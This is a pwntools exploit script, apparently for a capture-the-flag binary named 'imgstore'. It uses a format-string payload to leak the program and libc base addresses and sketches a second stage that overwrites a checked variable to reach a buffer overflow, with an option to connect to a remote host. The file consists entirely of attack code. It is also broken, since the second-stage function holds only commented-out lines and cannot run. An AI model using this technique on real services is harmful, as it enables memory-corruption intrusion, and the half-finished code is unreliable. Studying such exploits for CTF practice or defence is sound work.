#!/usr/bin/python3
from pwn import *
from time import sleep
#from angr import *


elf = context.binary = ELF("imgstore", checksec=True)
libc = elf.libc
#context.log_level = "debug"
context.log_level = "critical"  # quiet mode

gs = """
continue
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("1.1.1.1", 5555) 
    else:
        return process(elf.path)


io = start()

"""
Enter book title: %12$p
Book title --> 0x555555557008

Enter book title: %11$p
Book title --> 0x7ffff7fc26a0
"""
# leak a bunch of useful things 
def leak() -> (int, int):
    io.sendline(b"3")
    io.sendline(b"%12$p %11$p")
    io.recvuntil(b"Book title --> ")
    leaks = io.recvline(timeout=2).strip()
    leaks = leaks.split(b" ")
    return leaks


leaks = leak()
elf.address, libc.address = (int(leaks[0], 16) - 0x3008), (int(leaks[1], 16) - 0x1ed6a0)
log.info(f"ELF base: {elf.address:#0x}\nLibc base: {libc.address:#0x}")

# figure out how to trigger BOF path
# SOLVED: write 334873123 to the variable its checking and then after that write 1 to buf
def second_stage(): 
    
    #var = elf.address+0x6050
    #payload = fmtstr_payload(9, {var: 0x0}, write_size="byte") + p64(var)
    #print(payload, len(payload))
    
    #io.sendline(b"y")
    #io.sendline(payload)  # write fmt string payload to overwrite variable

second_stage()

io.interactive()
